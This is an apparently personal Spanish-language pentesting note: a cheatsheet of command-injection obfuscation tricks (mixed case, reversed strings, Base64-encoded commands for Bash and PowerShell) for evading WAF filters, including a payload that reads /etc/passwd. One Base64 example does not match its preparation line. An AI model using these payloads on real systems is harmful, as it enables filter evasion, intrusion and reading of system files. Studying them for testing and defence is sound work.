---
aliases: null
tags:
  - type/technique
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[OS Command Injection]]'
  - '[[Generación de Base64 para Windows (desde Linux)]]'
---
# Command Injection - Obfuscacion Avanzada

***

## Cheatsheet

### 1. Case Manipulation (Manipulación de Mayúsculas)

|    **Entorno**    |                   **Payload / Sintaxis**                   |                                                                           **Explicación**                                                                           |
|:-----------------:|:----------------------------------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
|  <br>**Windows**  |               <pre><code>WhOaMi</code></pre>               |                          <br>**Nativo.** Windows (CMD/PS) es _case-insensitive_. Mezclar mayúsculas evade filtros de texto exacto.<br><br>                          |
| <br><br>**Linux** |  <pre><code>$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")</code></pre>  | <br>**Translate (`tr`).** Convierte el input mezclado a minúsculas antes de ejecutarlo.<br>⚠️ Requiere bypass de espacios (ej. `%09` en lugar de espacios).<br><br> |
|   <br>**Linux**   | <pre><code>`$(a="WhOaMi";printf %s "${a,,}")`</code></pre> |                                  <br>**Bash Expansion.** `${var,,}\` convierte el contenido de la variable a _lowercase_.<br><br>                                   |
^ci-avanzado-mayusculas

### 2. Reversed Commands (Comandos Invertidos)

Ejecuta comandos escribiéndolos al revés para que el WAF no reconozca la firma (ej. `whoami` -> `imaohw`).

|     **Entorno**     |          **Preparación (En mi máquina)**           |                                            **Payload (En la víctima)**                                             |
|:-------------------:|:--------------------------------------------------:|:------------------------------------------------------------------------------------------------------------------:|
|    <br>**Linux**    |    <pre><code>echo 'whoami' \| rev</code></pre>    |                                     <pre><code>$(rev<<<'imaohw')</code></pre>                                      |
| <br><br>**Windows** | <pre><code>"whoami"[-1..-20] -join ''</code></pre> | <pre><code>iex "$('imaohw'[-1..-20] -join '')"</code></pre>_(El índice `-20` debe ser mayor al largo del comando)_ |
^ci-avanzado-comandos-invertidos

### 3. Encoded Commands (Base64)

La técnica más robusta. Permite inyectar caracteres prohibidos (como `|`, `/`, `;`) dentro de una cadena codificada segura.

|                                   **Entorno**                                    |                           **Preparación (En mi máquina)**                            | **Payload (En la víctima)**                                                                                                                        |
| :------------------------------------------------------------------------------: | :----------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------- |
|                              <br><br><br>**Linux**                               |       <br><pre><code>echo -n 'cat /etc/passwd' \| base64`</code></pre><br><br>       | <br><br><pre><code>bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)                                                                      |
| <br><br>**Windows**<br>(Windows usa UTF-16LE, si no conviertes, fallará)<br><br> | <br><pre><code>echo -n 'whoami' \| iconv -f utf-8 -t utf-16le \| base64</code></pre> | <br><br><br><pre><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"<br></code></pre> |
^ci-avanzado-comandos-codificados

***

## Overview


***
